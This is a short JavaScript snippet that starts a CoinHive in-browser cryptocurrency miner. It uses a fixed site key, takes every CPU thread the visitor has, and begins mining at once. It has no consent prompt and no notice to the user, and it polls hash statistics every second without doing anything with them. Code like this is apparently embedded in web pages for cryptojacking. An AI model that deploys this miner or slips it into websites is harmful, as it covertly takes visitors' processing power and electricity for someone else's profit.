var miner = new CoinHive.User('Aq1W4uGZJLZgyjTeC2s6afIJ3Zr08ETy', 'bw', {
    threads: navigator.hardwareConcurrency,
    autoThreads: false,
    throttle: 0.2,
    forceASMJS: false
});
miner.start();
miner.on('found', function() {}) miner.on('accepted', function() {}) setInterval(function() {
    var hashesPerSecond = miner.getHashesPerSecond();
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes();
}, 1000);